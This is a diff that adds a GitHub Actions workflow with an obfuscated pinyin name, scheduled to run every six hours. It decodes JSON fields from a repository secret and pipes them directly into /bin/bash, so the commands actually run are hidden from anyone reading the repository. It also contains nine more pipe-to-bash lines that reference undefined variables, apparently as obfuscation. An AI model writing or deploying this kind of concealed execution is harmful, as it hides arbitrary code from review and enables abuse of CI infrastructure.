@@ -1,0 +1,25 @@
+name: nixiangbusixangxinbushipojibeipiandig
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: nixiangbusixangxinbushipojibeipiandig
+        env:
+          mne996: ${{ secrets.mne996 }}
+        run: |
+          echo $mne996 | jq -r .hvnff2 | /bin/bash
+          echo $tbly3473 | jq -r .hrt686 | /bin/bash
+          echo $uba2948 | jq -r .gdc02842 | /bin/bash
+          echo $k3 | jq -r .vi19441 | /bin/bash
+          echo $fjgev31603 | jq -r .fwx700 | /bin/bash
+          echo $p06 | jq -r .ih7 | /bin/bash
+          echo $yi9 | jq -r .efse10 | /bin/bash
+          echo $e2 | jq -r .vc1 | /bin/bash
+          echo $xhz9 | jq -r .tzdw50432 | /bin/bash
+          echo $tey031 | jq -r .rzi48 | /bin/bash
+
